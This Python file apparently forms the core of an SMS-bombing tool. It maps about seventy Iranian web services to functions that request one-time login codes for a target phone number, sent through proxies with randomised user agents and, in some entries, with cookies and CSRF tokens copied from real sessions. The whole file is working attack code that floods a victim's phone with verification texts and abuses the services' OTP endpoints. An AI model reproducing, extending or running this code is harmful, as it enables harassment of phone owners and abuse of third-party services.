from requests import post, get
from user_agent import generate_user_agent

SERVICES = {
    'snapp': lambda num, proxies: post(
        proxies=proxies,
        url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
        json={"cellphone": "+98"+num},
        headers={
            "Host": "app.snapp.taxi",
            "content-length": "29",
            "x-app-name": "passenger-pwa",
            "x-app-version": "5.0.0",
            "app-version": "pwa",
            "user-agent": generate_user_agent(os="linux"),
            "content-type": "application/json",
            "accept": "*/*",
            "origin": "https://app.snapp.taxi",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://app.snapp.taxi/login/",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "fa-IR,fa;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6",
            "cookie": "_gat=1"
        }
    ),
    
    'tapsi': lambda num, proxies: post(
        proxies=proxies,
        url="https://tap33.me/api/v2/user",
        json={"credential":{"phoneNumber":f'0{num}',"role":"PASSENGER"}}
    ),
    
    'torob': lambda num, proxies: get(
        proxies=proxies,
        url=f'https://api.torob.com/a/phone/send-pin/?phone_number=0{num}',
        headers={
            "Host": "api.torob.com",
            "user-agent": generate_user_agent(os="linux"),
            "accept": "*/*",
            "origin": "https://torob.com",
            "sec-fetch-site": "same-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://torob.com/user/",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "fa-IR,fa;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6",
            "cookie": "amplitude_id_95d1eb61107c6d4a0a5c555e4ee4bfbbtorob.com=eyJkZXZpY2VJZCI6ImFiOGNiOTUyLTk1MTgtNDhhNS1iNmRjLTkwZjgxZTFjYmM3ZVIiLCJ1c2VySWQiOm51bGwsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTU5Njg2OTI4ODM1MSwibGFzdEV2ZW50VGltZSI6MTU5Njg2OTI4ODM3NCwiZXZlbnRJZCI6MSwiaWRlbnRpZnlJZCI6Miwic2VxdWVuY2VOdW1iZXIiOjN9"
        }
    ),
    
    'alibaba': lambda num, proxies: post(
        proxies=proxies,
        url="https://ws.alibaba.ir/api/v3/account/mobile/otp",
        json={"phoneNumber":f'0{num}'}
    ),
    
    'snapmarket': lambda num, proxies: post(
        proxies=proxies,
        url="https://account.api.balad.ir/api/web/auth/login/",
        json={
            "phone_number": f'0{num}',
            "os_type": "W"
        }
    ),
    
    'digikala': lambda num, proxies: post(
        proxies=proxies,
        url='https://api.digikala.com/v1/user/authenticate/',
        json={"username": f'0{num}'},
        headers={"User-Agent": generate_user_agent(os="mac")}
    ),
    
    'ghabzino': lambda num, proxies: post(
        proxies=proxies,
        url='https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode',
        json={"Parameters": {"MobileNumber": f'0{num}'}},
        headers={'content-type': 'application/json', 'User-Agent': generate_user_agent(os="linux")}
    ),
    
    'miareh': lambda num, proxies: get(
        proxies=proxies,
        url=f'https://www.miare.ir/p/restaurant/#/login?phone=0{num}'
    ),
    
    'ostadkar': lambda num, proxies: post(
        proxies=proxies,
        url="https://api.ostadkr.com/login",
        json={"mobile": f'0{num}'}
    ),
    
    'drnext': lambda num, proxies: post(
        proxies=proxies,
        url="https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", 
        json={
            "source": "besina",
            "mobile": f'0{num}'
        }
    ),
    
    'behtarino': lambda num, proxies: post(
        proxies=proxies,
        url="https://bck.behtarino.com/api/v1/users/jwt_phone_verification/", 
        json={"phone": f'0{num}'}
    ),
    
    
    'drto': lambda num, proxies: get(
        proxies=proxies,
        url="https://api.doctoreto.com/api/web/patient/v1/accounts/register",
        json={
            "mobile": num,
            "captcha": "",
            "country_id": 205
        }
    ),
    
    'banimod': lambda num, proxies: post(
        proxies=proxies,
        url="https://mobapi.banimode.com/api/v2/auth/request",
        json={"phone": f'0{num}'}
    ),
    
    'beroozmarket': lambda num, proxies: post(
        proxies=proxies,
        url="https://api.beroozmart.com/api/pub/account/send-otp",
        json={
            "mobile": f'0{num}', 
            "sendViaSms": True, 
            "email": "null", 
            "sendViaEmail": False
        }
    ),
    
    'itoll': lambda num, proxies: post(
        proxies=proxies,
        url="https://app.itoll.com/api/v1/auth/login",
        json={"mobile": f'0{num}'}
    ),
    
    'gap': lambda num, proxies: get(
        proxies=proxies,
        url=f'https://core.gap.im/v1/user/add.json?mobile=%2B98{num}'
    ),
    
    
    'mrbilit': lambda num, proxies: get(
        proxies=proxies,
        url=f'https://auth.mrbilit.com/api/login/exists/v2?mobileOrEmail=0{num}&source=2&sendTokenIfNot=true'
    ),
    
    'hamrahmechanich': lambda num, proxies: post(
        proxies=proxies,
        url="https://www.hamrah-mechanic.com/api/v1/membership/otp",
        json={
            "PhoneNumber": f'0{num}',
            "prevDomainUrl": "https://www.google.com/",
            "landingPageUrl": "https://www.hamrah-mechanic.com/cars-for-sale/",
            "orderPageUrl": "https://www.hamrah-mechanic.com/membersignin/",
            "prevUrl": "https://www.hamrah-mechanic.com/cars-for-sale/",
            "referrer": "https://www.google.com/"
        }
    ),
    
    'lendo': lambda num, proxies: post(
        proxies=proxies,
        url="https://api.lendo.ir/api/customer/auth/send-otp",
        json={"mobile": f'0{num}'}
    ),
    
    'taghche': lambda num, proxies: post(
        proxies=proxies,
        url="https://gw.taaghche.com/v4/site/auth/login",
        json={"contact": f'0{num}', "forceOtp": False}
    ),
    
    'ketabchi': lambda num, proxies: post(
        proxies=proxies,
        url="https://ketabchi.com/api/v1/auth/requestVerificationCode",
        json={"auth": {"phoneNumber": f'0{num}'}}
    ),
    
    'reyanertebet': lambda num, proxies: post(
        proxies=proxies,
        url="https://pay.rayanertebat.ir/api/User/Otp?t=1692088339811",
        json={"mobileNo": f'0{num}'}
    ),
    
    'bimito': lambda num, proxies: post(
        proxies=proxies,
        url="https://bimito.com/api/vehicleorder/v2/app/auth/login-with-verify-code",
        json={"phoneNumber": f'0{num}', "isResend": False}
    ),
    
    'pindo': lambda num, proxies: post(
        proxies=proxies,
        url="https://api.pindo.ir/v1/user/login-register/",
        json={"phone": f'0{num}'}
    ),
    
    'delino': lambda num, proxies: post(
        proxies=proxies,
        url="https://www.delino.com/user/register",
        json={"mobile": f'0{num}'}
    ),
    
    'zoodex': lambda num, proxies: post(
        proxies=proxies,
        url="https://admin.zoodex.ir/api/v1/login/check",
        json={"mobile": f'0{num}'}
    ),
    
    
    'baskol': lambda num, proxies: post(
        proxies=proxies,
        url="https://www.buskool.com/send_verification_code",
        json={"phone": f'0{num}'}
    ),
    
    'threetex': lambda num, proxies: post(
        proxies=proxies,
        url="https://3tex.io/api/1/users/validation/mobile",
        json={"receptorPhone": f'0{num}'}
    ),
    
    'deniizshop': lambda num, proxies: post(
        proxies=proxies,
        url="https://deniizshop.com/api/v1/sessions/login_request",
        json={"mobile_number": f'0{num}'}
    ),
    
    'flightio': lambda num, proxies: post(
        proxies=proxies,
        url="https://flightio.com/bff/Authentication/CheckUserKey",
        json={"userKey": f'0{num}'}
    ),
    
    'abantether': lambda num, proxies: post(
        proxies=proxies,
        url="https://abantether.com/users/register/phone/send/",
        json={"phoneNumber": f'0{num}'}
    ),
    
    'wideapp': lambda num, proxies: post(
        proxies=proxies,
        url="https://agent.wide-app.ir/auth/token",
        json={
            "grant_type": "otp", 
            "client_id": "62b30c4af53e3b0cf100a4a0", 
            "phone": f'0{num}'
        }
    ),
    
    'iranlms': lambda num, proxies: post(
        proxies=proxies,
        url="https://messengerg2c4.iranlms.ir/",
        json={"se": f'0{num}'}
    ),
    
    'snappfood': lambda num, proxies: post(
        proxies=proxies,
        url="https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&sms_apialClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.0&UDID=39c62f64-3d2d-4954-9033-816098559ae4&locale=fa",
        json={"cellphone": f'0{num}'}
    ),
    
    'bitbarg': lambda num, proxies: post(
        proxies=proxies,
        url="https://api.bitbarg.com/api/v1/authentication/registerOrLogin",
        json={"phone": f'0{num}'}
    ),
    
    'bahramshop': lambda num, proxies: post(
        proxies=proxies,
        url="https://api.bahramshop.ir/api/user/validate/username",
        json={"username": f'0{num}'}
    ),
    
    'tak': lambda num, proxies: post(
        proxies=proxies,
        url="https://takshopaccessorise.ir/api/v1/sessions/login_request",
        json={"mobile_phone": f'0{num}'}
    ),
    
    
    'kilid': lambda num, proxies: post(
        proxies=proxies,
        url="https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL",
        json={"mobile": f'0{num}'}
    ),
    
    'otaghak': lambda num, proxies: post(
        proxies=proxies,
        url="https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode",
        json={"userName": f'0{num}'}
    ),
    
    
    'namava': lambda num, proxies: post(
        proxies=proxies,
        url="https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",
        json={"UserName": f'0{num}'}
    ),
    
    
    'anargift': lambda num, proxies: post(
        proxies=proxies,
        url="https://api.anargift.com/api/people/auth",
        json={"user": f'0{num}'}
    ),
    
    'nobat': lambda num, proxies: post(
        proxies=proxies,
        url="https://nobat.ir/api/public/patient/login/phone",
        json={"mobile": f'0{num}'}
    ),
    
    'ayantech': lambda num, proxies: post(
        proxies=proxies,
        url="https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode",
        json={
            "Parametrs": {
                "ApplicationType": "Web",
                "ApplicationUniqueToken": None, 
                "ApplicationVersion": "1.0.0",
                "MobileNumber": f'0{num}' 
            }
        }
    ),
    
    'simkhan': lambda num, proxies: post(
        proxies=proxies,
        url="https://www.simkhanapi.ir/api/users/registerV2",
        json={"mobileNumber": f'0{num}'}
    ),
    
    'sibirani': lambda num, proxies: post(
        proxies=proxies,
        url="https://sandbox.sibirani.ir/api/v1/user/invite",
        json={"username": f'0{num}'}
    ),
    
    'hiword': lambda num, proxies: post(
        proxies=proxies,
        url="https://hiword.ir/wp-json/otp-login/v1/login",
        json={"identifier": f'0{num}'}
    ),
    
    
    'digistyle': lambda num, proxies: post(
        proxies=proxies,
        url="https://www.digistyle.com/users/login-register/",
        json={"loginRegister[email_phone]": f'0{num}'}
    ),
    
    'banankala': lambda num, proxies: post(
        proxies=proxies,
        url="https://banankala.com/home/login",
        json={"Mobile": f'0{num}'}
    ),
    
    
    'exo': lambda num, proxies: post(
        proxies=proxies,
        url="https://exo.ir/index.php?route=account/mobile_login",
        json={"mobile_number": f'0{num}'}
    ),
    
    'shahrefarsh': lambda num, proxies: post(
        proxies=proxies,
        url="https://shahrfarsh.com/Account/Login",
        json={"phoneNumber": f'0{num}'}
    ),
    
    'beheshticarpet': lambda num, proxies: post(
        proxies=proxies,
        url="https://takfarsh.com/wp-content/themes/bakala/template-parts/send.php",
        json={"phone_email": f'0{num}'}
    ),
    
    'khanomi': lambda num, proxies: post(
        proxies=proxies,
        url="https://www.khanoumi.com/accounts/sendotp",
        json={"mobile": f'0{num}'}
    ),
    
    'rojashop': lambda num, proxies: post(
        proxies=proxies,
        url="https://rojashop.com/api/auth/sendOtp",
        json={"mobile": f'0{num}'}
    ),
    
    'dadpardaz': lambda num, proxies: post(
        proxies=proxies,
        url="https://dadpardaz.com/advice/getLoginConfirmationCode",
        json={"mobile": f'0{num}'}
    ),
    
    'rokla': lambda num, proxies: post(
        proxies=proxies,
        url="https://api.rokla.ir/api/request/otp",
        json={"mobile": f'0{num}'}
    ),
    
    'pezeshket': lambda num, proxies: post(
        proxies=proxies,
        url="https://api.pezeshket.com/core/v1/auth/requestCode",
        json={"mobileNumber": f'0{num}'}
    ),
    
    'virgool': lambda num, proxies: post(
        proxies=proxies,
        url="https://virgool.io/api/v1.4/auth/verify",
        json={"method": "phone", "identifier": f'0{num}'}
    ),
    
    'timcheh': lambda num, proxies: post(
        proxies=proxies,
        url="https://api.timcheh.com/auth/otp/send",
        json={"mobile": f'0{num}'}
    ),
    
    'paklean': lambda num, proxies: post(
        proxies=proxies,
        url="https://client.api.paklean.com/user/resendCode",
        json={"username": f'0{num}'}
    ),
    
    'daal': lambda num, proxies: post(
        proxies=proxies,
        url="https://daal.co/api/authentication/login-register/method/phone-otp/user-role/customer/verify-request",
        headers={"Accept": "application/json"},
        json={"phone": f"0{num}"}
    ),
    
    'bimebazar': lambda num, proxies: post(
        proxies=proxies,
        url="https://bimebazar.com/accounts/api/login_sec/",
        json={"username": f"0{num}"}
    ),
    
    'azki': lambda num, proxies: post(
        proxies=proxies,
        url="https://www.azki.co/api/vehicleorder/v2/app/auth/check-login-availability/",
        json={"phoneNumber": f"0{num}"}
    ),
    
    'safarmarket': lambda num, proxies: post(
        proxies=proxies,
        url="https://safarmarket.com//api/security/v2/user/otp",
        json={"phone": f"0{num}"}
    ),
    
    'shad': lambda num, proxies: post(
        proxies=proxies,
        url="https://shadmessenger12.iranlms.ir/",
        headers={
            "Host": "shadmessenger12.iranlms.ir",
            "content-length": "96",
            "accept": "application/json, text/plain, */*",
            "user-agent": generate_user_agent(os="android"),
            "content-type": "text/plain",
            "origin": "https://shadweb.iranlms.ir",
            "sec-fetch-site": "same-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://shadweb.iranlms.ir/",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "fa-IR,fa;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6"
        },
        json={
            "api_version": "3",
            "method": "sendCode",
            "data": {
                "phone_number": "098"+num,
                "send_type": "SMS"
            }
        }
    ),
    
    'emtiaz': lambda num, proxies: post(
        proxies=proxies,
        url="https://web.emtiyaz.app/json/login",
        headers={
            "Host": "web.emtiyaz.app",
            "Connection": "keep-alive",
            "Content-Length": "28",
            "Cache-Control": "max-age=0",
            "Upgrade-Insecure-Requests": "1",
            "Origin": "https://web.emtiyaz.app",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": generate_user_agent(os="android"),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Referer": "https://web.emtiyaz.app/login",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "fa-IR,fa;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6",
            "Cookie": "__cfduid=d3744e2448268f90a1ea5a4016884f7331596404726; __auc=d86ede5a173b122fb752f98d012; _ga=GA1.2.719537155.1596404727; __asc=7857da15173c7c2e3123fd4c586; _gid=GA1.2.941061447.1596784306; _gat_gtag_UA_124185794_1=1"
        },
        data=f"send=1&cellphone=0{num}"
    ),
    
    'azinja': lambda num, proxies: post(
        proxies=proxies,
        url="https://arzinja.app/api/login",
        headers={
            "Host": "arzinja.app",
            "content-type": "multipart/form-data; boundary=----WebKitFormBoundarycIO8Y5lNAbbiVXKS",
            "sec-ch-ua": "\"Chromium\";v=\"110\", \"Not A(Brand\";v=\"24\", \"Google Chrome\";v=\"110\"",
            "accept": "application/json, text/plain, */*",
            "sec-ch-ua-mobile": "?1",
            "user-agent": generate_user_agent(os="android"),
            "sec-ch-ua-platform": "Android",
            "origin": "https://arzinja.info",
            "sec-fetch-site": "cross-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://arzinja.info/",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7"
        },
        data=f"------WebKitFormBoundarycIO8Y5lNAbbiVXKS\r\nContent-Disposition: form-data; name=\"mobile\"\r\n\r\n0{num}\r\n------WebKitFormBoundarycIO8Y5lNAbbiVXKS--\r\n"
    ),
    
    'rubika': lambda num, proxies: post(
        proxies=proxies,
        url="https://messengerg2c4.iranlms.ir/",
        headers={
            "Host": "messengerg2c4.iranlms.ir",
            "content-length": "96",
            "accept": "application/json, text/plain, */*",
            "user-agent": generate_user_agent(os="android"),
            "content-type": "text/plain",
            "origin": "https://web.rubika.ir",
            "sec-fetch-site": "cross-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://web.rubika.ir/",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "fa-IR,fa;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6"
        },
        json={
            "api_version": "3",
            "method": "sendCode",
            "data": {
                "phone_number": num,
                "send_type": "SMS"
            }
        }
    ),
    
    'bama': lambda num, proxies: post(
        proxies=proxies,
        url="https://bama.ir/signin-checkforcellnumber",
        headers={
            "Host": "bama.ir",
            "content-length": "22",
            "accept": "application/json, text/javascript, */*; q=0.01",
            "x-requested-with": "XMLHttpRequest",
            "user-agent": generate_user_agent(os="android"),
            "csrf-token-bama-header": "CfDJ8N00ikLDmFVBoTe5ae5U4a2G6aNtBFk_sA0DBuQq8RmtGVSLQEq3CXeJmb0ervkK5xY2355oMxH2UDv5oU05FCu56FVkLdgE6RbDs1ojMo90XlbiGYT9XaIKz7YkZg-8vJSuc7f3PR3VKjvuu1fEIOE",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://bama.ir",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://bama.ir/Signin?ReturnUrl=%2Fprofile",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "fa-IR,fa;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6",
            "cookie": "CSRF-TOKEN-BAMA-COOKIE=CfDJ8N00ikLDmFVBoTe5ae5U4a1o5aOrFp-FIHLs7P3VvLI7yo6xSdyY3sJ5GByfUKfTPuEgfioiGxRQo4G4JzBin1ky5-fvZ1uKkrb_IyaPXs1d0bloIEVe1VahdjTQNJpXQvFyt0tlZnSAZFs4eF3agKg"
        },
        data=f"cellNumber=0{num}"
    )
}
